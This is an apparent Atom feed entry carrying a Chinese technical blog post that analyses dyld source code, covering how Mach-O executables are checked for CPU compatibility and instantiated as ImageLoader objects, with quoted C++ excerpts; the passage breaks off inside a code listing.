    <title><![CDATA[dyld中mach-o文件加载的简单分析]]></title>
    <link href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/03/01/dyld中macho加载的简单分析/</id>
    <published>2016-03-01T22:06:57.000Z</published>
    <updated>2016-03-24T03:35:46.000Z</updated>
    <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p> Les commencements ont des charmes inexprimables.<br> 万物初始，美妙不可名状。</p>
</blockquote>
<p>通过阅读dyld源码，简单的分析macho在dyld中是如何被加载到内存中的。</p>
<a id="more"></a>
<h1 id="0x01_源码分析">0x01 源码分析</h1><p>mach-o的格式和ELF大同小异，具体分析网上可以搜到很多。就不复述了。</p>
<p><a href="https://samhuri.net/posts/2010/01/basics-of-the-mach-o-file-format" target="_blank" rel="external">Basics of the Mach-O file format</a></p>
<p><a href="http://opensource.apple.com/tarballs/dyld/dyld-360.18.tar.gz" target="_blank" rel="external">dyld源码下载</a></p>
<h1 id="1-1_数据结构">1.1 数据结构</h1><h3 id="1-1-1_macho_header">1.1.1 macho_header</h3><p>这个数据结构提供了对mach-o文件的头部做操作的API，函数都很简单不需要做过多的解释。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/UMLClassDiagram-macho_header.png" alt="macho_header"></p>
<h2 id="1-1-2_ImageLoader">1.1.2  ImageLoader</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ImageLoader is an abstract base class.  To support loading a particular executable</span></span><br><span class="line"><span class="comment">// file format, you make a concrete subclass of ImageLoader.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For each executable file (dynamic shared object) in use, an ImageLoader is instantiated.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The ImageLoader base class does the work of linking together images, but it knows nothing</span></span><br><span class="line"><span class="comment">// about any particular file format.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">class</span>  &#123;ImageLoader</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一个加载的mach-o文件都会存在这样一个<code>ImageLoader</code>的实例。具体代码太多参考<a href="http://opensource.apple.com/tarballs/dyld/dyld-360.18.tar.gz" target="_blank" rel="external">源码</a>。</p>
<p>每一种具体的mach-o文件都会继承<code>ImageLoader</code>类，大致继承关系如图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/Butterfly-ImageLoader.png" alt="mageLoder"></p>
<p>在加载时会根据mach-o的格式不同选择不同的实例。</p>
<h2 id="1-2_源码分析">1.2 源码分析</h2><h3 id="1-2-1__main">1.2.1 _main</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Entry point for dyld.  The kernel loads dyld and jumps to __dyld_start which</span></span><br><span class="line"><span class="comment">// sets up some registers and call this function.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns address of main() in target program which __dyld_start jumps to</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">uintptr_t</span></span><br><span class="line">_main(<span class="keyword">const</span> macho_header* mainExecutableMH, <span class="keyword">uintptr_t</span> mainExecutableSlide, </span><br><span class="line">		<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[], <span class="keyword">const</span> <span class="keyword">char</span>* envp[], <span class="keyword">const</span> <span class="keyword">char</span>* apple[], </span><br><span class="line">		<span class="keyword">uintptr_t</span>* startGlue)</span><br><span class="line">&#123;</span><br><span class="line">  ... <span class="comment">//对全局变量一通操作</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="comment">// add dyld itself to UUID list</span></span><br><span class="line">		addDyldImageToUUIDList();</span><br><span class="line">		CRSetCrashLogMessage(sLoadingCrashMessage);</span><br><span class="line">		<span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">		sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br><span class="line">		... <span class="comment">//不关心了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用<code>_main</code>函数之后，大致做了这么几件事情：</p>
<ul>
<li>选择运行环境(IOS模拟器)</li>
<li>初始化数据、设置全局变量，上下文信息</li>
<li>检测文件是否<code>Restricted</code></li>
</ul>
<p>走完这些流程，就会调用<code>instantiateFromLoadedImage</code>函数开始加载mach-o并实例化为<code>ImageLoader</code>。</p>
<h3 id="1-2-2_instantiateFromLoadedImage">1.2.2 instantiateFromLoadedImage</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The kernel maps in main executable before dyld gets control.  We need to </span></span><br><span class="line"><span class="comment">// make an ImageLoader* for the already mapped in main executable.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">instantiateFromLoadedImage</span><span class="params">(<span class="keyword">const</span> macho_header* mh, uintptr_t slide, <span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">// try mach-o loader</span></span><br><span class="line">	<span class="keyword">if</span> ( isCompatibleMachO((<span class="keyword">const</span> <span class="keyword">uint8_t</span>*)mh, path) ) &#123;<span class="comment">//检测是否合法</span></span><br><span class="line">		ImageLoader* image = ImageLoaderMachO::instantiateMainExecutable(mh, slide, path, gLinkContext); <span class="comment">//加载</span></span><br><span class="line">		addImage(image);</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">throw</span> <span class="string">"main executable not a known format"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑非常的简单，总过做了三件事：</p>
<ul>
<li>检测macho文件是否符合条件</li>
<li>初始化实例</li>
<li>添加image到管理的模块中</li>
</ul>
<h3 id="1-2-3_isCompatibleMachO">1.2.3 isCompatibleMachO</h3><p>先看<code>isCompatibleMacho</code>函数。</p>
<p>通过注释可以知道，满足下面三个条件，即可认为是符合要求的mach-o文件。</p>
<ol>
<li><code>mach_header</code>中的<code>subtype</code>当前CPU版本是否支持。</li>
</ol>
<ol>
<li><p><code>mach_header</code>中的<code>subtype</code>和当前正在运行的CPU版本相同。</p>
</li>
<li><p><code>mach_header</code>中的<code>subtype</code>在该CPU的所有版本都可以处理。</p>
</li>
</ol>
<p>内核中<code>machine.h</code>定义了<code>CPU_TYPE</code>与<code>CPU_SUBTYPE</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ANY		((cpu_type_t) -<span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_VAX		((cpu_type_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 2)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 3)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 4)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 5)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_TYPE_MC680x0	((cpu_type_t) <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_X86		((cpu_type_t) <span class="number">7</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_I386		CPU_TYPE_X86		<span class="comment">/* compatibility */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_TYPE_X86_64		(CPU_TYPE_X86 | CPU_ARCH_ABI64)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* skip CPU_TYPE_MIPS		((cpu_type_t) 8)	*/</span></span><br><span class="line"><span class="comment">/* skip 			((cpu_type_t) 9)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_MC98000	((cpu_type_t) <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_HPPA           ((cpu_type_t) <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ARM		((cpu_type_t) <span class="number">12</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ARM64          (CPU_TYPE_ARM | CPU_ARCH_ABI64)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_MC88000	((cpu_type_t) <span class="number">13</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_SPARC		((cpu_type_t) <span class="number">14</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_I860		((cpu_type_t) <span class="number">15</span>)</span></span><br><span class="line"><span class="comment">/* skip	CPU_TYPE_ALPHA		((cpu_type_t) 16)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 17)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_POWERPC		((cpu_type_t) <span class="number">18</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_POWERPC64		(CPU_TYPE_POWERPC | CPU_ARCH_ABI64)</span></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	Machine subtypes (these are defined here, instead of in a machine</span><br><span class="line"> *	dependent directory, so that any program can get all definitions</span><br><span class="line"> *	regardless of where is it compiled).</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * Capability bits used in the definition of cpu_subtype.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_MASK	<span class="number">0xff000000</span>	<span class="comment">/* mask for feature flags */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_LIB64	<span class="number">0x80000000</span>	<span class="comment">/* 64 bit libraries */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	Object files that are hand-crafted to run on any</span><br><span class="line"> *	implementation of an architecture are tagged with</span><br><span class="line"> *	CPU_SUBTYPE_MULTIPLE.  This functions essentially the same as</span><br><span class="line"> *	the "ALL" subtype of an architecture except that it allows us</span><br><span class="line"> *	to easily find object files that may need to be modified</span><br><span class="line"> *	whenever a new implementation of an architecture comes out.</span><br><span class="line"> *</span><br><span class="line"> *	It is the responsibility of the implementor to make sure the</span><br><span class="line"> *	software handles unsupported implementations elegantly.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_SUBTYPE_MULTIPLE		((cpu_subtype_t) -<span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_LITTLE_ENDIAN	((cpu_subtype_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_BIG_ENDIAN		((cpu_subtype_t) <span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *     Machine threadtypes.</span><br><span class="line"> *     This is none - not defined - for most machine types/subtypes.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_THREADTYPE_NONE		((cpu_threadtype_t) <span class="number">0</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	VAX subtypes (these do *not* necessary conform to the actual cpu</span><br><span class="line"> *	ID assigned by DEC available via the SID register).</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_SUBTYPE_VAX_ALL	((cpu_subtype_t) <span class="number">0</span>) </span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX780	((cpu_subtype_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX785	((cpu_subtype_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX750	((cpu_subtype_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX730	((cpu_subtype_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXI	((cpu_subtype_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXII	((cpu_subtype_t) <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8200	((cpu_subtype_t) <span class="number">7</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8500	((cpu_subtype_t) <span class="number">8</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8600	((cpu_subtype_t) <span class="number">9</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8650	((cpu_subtype_t) <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8800	((cpu_subtype_t) <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXIII	((cpu_subtype_t) <span class="number">12</span>)</span></span><br></pre></td></tr></table></figure>
<p>简单的说<code>cputype</code>就是cpu的平台，<code>x86</code>、<code>ARM</code>、<code>PROWERPC</code>等。而<code>subtype</code>就是不同平台的不同版本，例如<code>arm6</code>、<code>arm7</code>。</p>
<p></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isCompatibleMachO</span><span class="params">(<span class="keyword">const</span> uint8_t* firstPage, <span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CPU_SUBTYPES_SUPPORTED</span></span><br><span class="line">  	<span class="comment">// 支持检测CPU版本的情况</span></span><br><span class="line">	<span class="comment">// It is deemed compatible if any of the following are true:</span></span><br><span class="line">	<span class="comment">//  1) mach_header subtype is in list of compatible subtypes for running processor</span></span><br><span class="line">	<span class="comment">//  2) mach_header subtype is same as running processor subtype</span></span><br><span class="line">	<span class="comment">//  3) mach_header subtype runs on all processor variants</span></span><br><span class="line">	<span class="keyword">const</span> mach_header* mh = (mach_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( mh-&gt;magic == sMainExecutableMachHeader-&gt;magic ) &#123; </span><br><span class="line">		<span class="comment">//传入的mach-o文件的magic是否和加载的主mach-o文件是否相同</span></span><br><span class="line">		<span class="comment">//这一次运行到这里的时候mh与sMainExecutableMacHeader应该是指向同一个mach-o的</span></span><br><span class="line">		<span class="keyword">if</span> ( mh-&gt;cputype == sMainExecutableMachHeader-&gt;cputype ) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (mh-&gt;cputype &amp; CPU_TYPE_MASK) == sHostCPU ) &#123;</span><br><span class="line">				<span class="comment">//加载的mh是否在当前平台可以运行。</span></span><br><span class="line">				<span class="comment">// get preference ordered list of subtypes that this machine can use</span></span><br><span class="line">				<span class="keyword">const</span> <span class="keyword">cpu_subtype_t</span>* subTypePreferenceList = findCPUSubtypeList(mh-&gt;cputype, sHostCPUsubtype);</span><br><span class="line">				<span class="keyword">if</span> ( subTypePreferenceList != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">                  	  <span class="comment">//如果该CPU的版本存在一个检测的列表，则进行检测</span></span><br><span class="line">					<span class="comment">// if image's subtype is in the list, it is compatible</span></span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">cpu_subtype_t</span>* p = subTypePreferenceList; *p != CPU_SUBTYPE_END_OF_LIST; ++p) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( *p == mh-&gt;cpusubtype )</span><br><span class="line">							<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="comment">// have list and not in list, so not compatible</span></span><br><span class="line">					throwf(<span class="string">"incompatible cpu-subtype: 0x%08X in %s"</span>, mh-&gt;cpusubtype, path);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// unknown cpu sub-type, but if exact match for current subtype then ok to use</span></span><br><span class="line">				<span class="keyword">if</span> ( mh-&gt;cpusubtype == sHostCPUsubtype ) </span><br><span class="line">                  	<span class="comment">//加载的mh与当前运行环境的CPU版本相同</span></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// cpu type has no ordered list of subtypes</span></span><br><span class="line">             <span class="comment">// 这两种CPU支持所有版本的mach-o文件</span></span><br><span class="line">			<span class="keyword">switch</span> (mh-&gt;cputype) &#123;</span><br><span class="line">				<span class="keyword">case</span> CPU_TYPE_I386:</span><br><span class="line">				<span class="keyword">case</span> CPU_TYPE_X86_64:</span><br><span class="line">					<span class="comment">// subtypes are not used or these architectures</span></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="comment">// For architectures that don't support cpu-sub-types</span></span><br><span class="line">	<span class="comment">// this just check the cpu type.</span></span><br><span class="line">  	<span class="comment">// 不支持检测CPU版本的时候，就只判断是mh的版本与CPU相同。</span></span><br><span class="line">	<span class="keyword">const</span> mach_header* mh = (mach_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( mh-&gt;magic == sMainExecutableMachHeader-&gt;magic ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( mh-&gt;cputype == sMainExecutableMachHeader-&gt;cputype ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-4_instantiateMainExecutable">1.2.4 instantiateMainExecutable</h3><p>函数流程主要是通过<code>sniffloadcommands</code>来判断mach-o文件是否是压缩过的，然后选择相应的类进行实例化。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create image for main executable</span></span><br><span class="line">ImageLoader* ImageLoaderMachO::instantiateMainExecutable(<span class="keyword">const</span> macho_header* mh, <span class="keyword">uintptr_t</span> slide, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LinkContext&amp; context)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//dyld::log("ImageLoader=%ld, ImageLoaderMachO=%ld, ImageLoaderMachOClassic=%ld, ImageLoaderMachOCompressed=%ld\n",</span></span><br><span class="line">	<span class="comment">//	sizeof(ImageLoader), sizeof(ImageLoaderMachO), sizeof(ImageLoaderMachOClassic), sizeof(ImageLoaderMachOCompressed));</span></span><br><span class="line">	<span class="keyword">bool</span> compressed;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> libCount;</span><br><span class="line">	<span class="keyword">const</span> linkedit_data_command* codeSigCmd;</span><br><span class="line">	<span class="keyword">const</span> encryption_info_command* encryptCmd;</span><br><span class="line">	sniffLoadCommands(mh, path, <span class="literal">false</span>, &amp;compressed, &amp;segCount, &amp;libCount, context, &amp;codeSigCmd, &amp;encryptCmd); <span class="comment">//判断macho是普通的还是压缩的</span></span><br><span class="line">	<span class="comment">// instantiate concrete class based on content of load commands</span></span><br><span class="line">	<span class="keyword">if</span> ( compressed ) </span><br><span class="line">		<span class="keyword">return</span> ImageLoaderMachOCompressed::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> SUPPORT_CLASSIC_MACHO</span></span><br><span class="line">		<span class="keyword">return</span> ImageLoaderMachOClassic::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"missing LC_DYLD_INFO load command"</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑也非常简单。流程图如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/instantiateMainExecutable.png" alt="instantiateMainExecutable"></p>
<h3 id="1-2-5_sniffLoadCommands">1.2.5 sniffLoadCommands</h3><p>这个函数主要做了两件事情：</p>
<ul>
<li>判断Mach-O文件是<code>classic</code>的还是<code>compressed</code>的。</li>
<li>获取mach-O文件的<code>segment</code>的数量。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span 